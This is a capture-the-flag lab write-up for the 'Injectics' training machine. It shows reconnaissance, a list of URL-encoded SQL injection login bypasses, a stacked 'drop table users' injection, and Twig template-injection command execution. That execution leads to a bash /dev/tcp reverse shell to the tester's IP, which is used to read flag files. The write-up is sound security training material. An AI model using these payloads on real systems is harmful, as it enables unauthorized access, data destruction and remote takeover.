## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Start the VM by clicking the `Start Machine` button at the top of the task. You can complete the challenge by connecting through VPN or the AttackBox containing all the essential tools.
_Can you utilise your web pen-testing skills to safeguard the event from any injection attack?_
```
Lets start with Rustscan 
```bash 
rustscan -a 10.10.251.37
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```
after navigating to [http://10.10.251.37] I discovered the developer id and email in Source
```Source
<!-- Website developed by John Tim - dev@injectics.thm-->
<!-- Mails are stored in mail.log file-->
    <!-- Bootstrap JS and dependencies -->
```
with this we get Hint about `Mail,log` and after navigating to [http://10.10.251.37/mail.log]
I got 
```Output
From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays
Hey,
Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.
To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.
Here are the default credentials that will be added:

| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | [password omitted]    |
| dev@injectics.thm         | [password omitted]            |

Please let me know if there are any further updates or changes needed.
Best regards,
Dev Team
dev@injectics.thm
```
Then Run `Gobuster/ffuf` as your want
```bash
gobuster dir -u http://10.10.251.37/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,bak
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 6588]
/login.php            (Status: 200) [Size: 5401]
/flags                (Status: 301) [Size: 312] [--> http://10.10.251.37/flags/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.251.37/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.251.37/js/]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.251.37/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/vendor               (Status: 301) [Size: 313] [--> http://10.10.251.37/vendor/]
/dashboard.php        (Status: 302) [Size: 0] [--> dashboard.php]
/functions.php        (Status: 200) [Size: 0]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.251.37/phpmyadmin/]
```
then lets start with `burpsuite` and navigate to [http://10.10.251.37/Login.php]
then we just start `intercept` and `capture` the `login http request` and send it to `intruder`
and after that we just first try with email which we got dev@injectics.thm  with `burteforce` which doesn't work so we just start using SQL Injects with URL encoded and got the result 
```Result
%22%20%6f%72%20%22%61%22%3d%22%61	200	207	false	false	369	
%22%29%20%6f%72%20%28%22%61%22%3d%22%61	200	213	false	false	369	
%27%20%6f%72%20%27%6f%6e%65%27%3d%27%6f%6e%65	200	205	false	false	369	
%27%20%6f%72%20%27%6f%6e%65%27%3d%27%6f%6e%65%e2%80%93	200	165	false	false	369	
%27%20%6f%72%20%75%69%64%20%6c%69%6b%65%20%27%25	200	178	false	false	369	
%27%20%6f%72%20%75%6e%61%6d%65%20%6c%69%6b%65%20%27%25	200	178	false	false	369	
%27%20%6f%72%20%75%73%65%72%69%64%20%6c%69%6b%65%20%27%25	200	180	false	false	369	
%27%20%6f%72%20%75%73%65%72%20%6c%69%6b%65%20%27%25	200	191	false	false	369	
%27%20%6f%72%20%75%73%65%72%6e%61%6d%65%20%6c%69%6b%65%20%27%25	200	167	false	false	369	
%27%20%6f%72%20%27%78%27%3d%27%78	200	182	false	false	369	
%27%29%20%6f%72%20%28%27%78%27%3d%27%78	200	183	false	false	369	
%22%20%6f%72%20%22%78%22%3d%22%78	200	195	false	false	369	
%27%20%4f%52%20%27%78%27%3d%27%78%27%23%3b	200	162	false	false	487	
%27%3d%27%20%27%6f%72%27%20%61%6e%64%20%27%3d%27%20%27%6f%72%27	200	161	false	false	369	
%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%31%2c%20%40%40%76%65%72%73%69%6f%6e%3b%23	200	163	false	false	369	
%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%73%79%73%74%65%6d%5f%75%73%65%72%28%29%2c%75%73%65%72%28%29%3b%23	200	177	false	false	369	
```

We Ignored all the other Request except with length 487 which shows 
Request like this 
```Request
POST /functions.php HTTP/1.1
Host: 10.10.251.37
Content-Length: 80
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Origin: http://10.10.251.37
Referer: http://10.10.251.37/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=6fsd683k8tnahnqcamjea1i1qq
Connection: keep-alive

username=d%27%20%4f%52%20%27%78%27%3d%27%78%27%23%3b&password=tre&function=login
```
And Response like This 
```Response 
HTTP/1.1 200 OK
Date: Tue, 08 Jul 2025 12:04:13 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 150
Keep-Alive: timeout=5, max=83
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"status":"success","message":"Login successful","is_admin":"true","first_name":"dev","last_name":"dev","redirect_link":"dashboard.php?isadmin=false"}
```
And After investigating and decoding the `%27%20%4f%52%20%27%78%27%3d%27%78%27%23%3b`
we discovered ' OR 'x'='x'#; which hit the Login for dev
and after login using dev we get options for edit medals and rank in which we trying to inject our own  query which dropdown user table 
```Request
POST /edit_leaderboard.php HTTP/1.1
Host: 10.10.251.37
Content-Length: 46
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.251.37
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.251.37/edit_leaderboard.php?rank=1&country=USA
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=6fsd683k8tnahnqcamjea1i1qq
Connection: keep-alive
rank=1&country=&gold=22&silver=21&bronze=12345 ; drop table users -- -
```

and Response 
```Response 
Seems like database or some important table is deleted. InjecticsService is running to restore it. Please wait for 1-2 minutes. 
```
which indicates that we can inject our own methods or calls so we try to drop down the table for user password for admin login
```Request
POST /adminLogin007.php HTTP/1.1
Host: 10.10.251.37
Content-Length: 57
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.251.37
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.251.37/adminLogin007.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=6fsd683k8tnahnqcamjea1i1qq
Connection: keep-alive

mail=superadmin%40injectics.thm&pass=[password omitted]
```
We Get Response 
```Response 
GET /dashboard.php HTTP/1.1
Host: 10.10.251.37
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.251.37/adminLogin007.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=6fsd683k8tnahnqcamjea1i1qq
Connection: keep-alive
```

And Got our First Flag
```Flag 1 
[flag omitted]
```

then lets move on to our next flag
which is related to #SSTI_BSCP
I looked at SSTI payloads:
- (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig

Test Using 
`{{7*7}}`
then we tried 
```Inject
{{['id',""]|sort('passthru')}} 
```
which gives us result on dashboard.php
as 
```Result
Welcome, uid=33(www-data) gid=33(www-data) groups=33(www-data) Array !
```
after this we try to get reverse shell so we try to hit the reverse shell
```payload
{{ ["bash -c 'exec bash -i >& /dev/tcp/10.17.36.74/4445 0>&1'", ""] | sort('passthru') }}
```
After successfully updated the profile I Navigate to the `Dashboard.php` and got the reverse shell on my terminal
```bash
 nc -lvnp 4445 
listening on [any] 4445 ...
connect to [10.17.36.74] from (UNKNOWN) [10.10.251.37] 49710
bash: cannot set terminal process group (740): Inappropriate ioctl for device
bash: no job control in this shell
www-data@injectics:/var/www/html$ ls
ls
adminLogin007.php
banner.jpg
composer.json
composer.lock
conn.php
css
dashboard.php
edit_leaderboard.php
flags
functions.php
index.php
injecticsService.php
js
login.php
logout.php
mail.log
script.js
styles.css
update_profile.php
vendor
www-data@injectics:/var/www/html$ ls | grep flag
ls | grep flag
flags
www-data@injectics:/var/www/html$ cd flags
cd flags
www-data@injectics:/var/www/html/flags$ ls
ls
5d8af1dc14503c7e4bdc8e51a3469f48.txt
www-data@injectics:/var/www/html/flags$ cat 5d8af1dc14503c7e4bdc8e51a3469f48.txt
<tml/flags$ cat 5d8af1dc14503c7e4bdc8e51a3469f48.txt
[flag omitted]
```
there is another way to get the output or the flag using `linux` command as it is based on `linux ` machine which allow linux command as 

```Command-Injection
{{['pwd',""]|sort('passthru')}}
Ouput = Welcome, /var/www/html Array!

{{['ls ',""]|sort('passthru')}}
Output = Welcome, adminLogin007.php banner.jpg composer.json composer.lock conn.php css dashboard.php edit_leaderboard.php flags functions.php index.php injecticsService.php js login.php logout.php mail.log script.js styles.css update_profile.php vendor Array!

Which gives us Folder flags

{{['ls /var/www/html/flags',""]|sort('passthru')}}
Output = Welcome, 5d8af1dc14503c7e4bdc8e51a3469f48.txt Array!

{{['cat /var/www/html/flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt',""]|sort('passthru')}}
Output = Welcome, [flag omitted] Array!
``` 
Got the Flag
```flag
[flag omitted]
```
